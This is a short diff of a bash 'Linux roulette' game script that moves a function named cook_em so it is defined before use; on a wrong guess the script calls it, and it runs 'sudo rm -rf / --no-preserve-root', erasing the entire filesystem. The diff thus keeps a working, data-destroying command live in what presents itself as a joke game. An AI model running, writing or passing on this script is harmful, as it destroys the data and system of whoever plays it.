@@ -6,6 +6,10 @@ fi
 random_number=$((1 + $RANDOM % 6))
 echo "Linux roulette..."
 read -p "Choose a number between 1 and 6: " choice
+function cook_em(){
+    echo "goodbye..."
+    sudo rm -rf / --no-preserve-root
+}
 if [[ $choice == $random_number ]]; then
   echo "You win!!!"
 else
@@ -20,8 +24,4 @@ else
     sleep 1
     cook_em
   fi
-  function cook_em(){
-    echo "goodbye..."
-    sudo rm -rf / --no-preserve-root
-  }
 fi
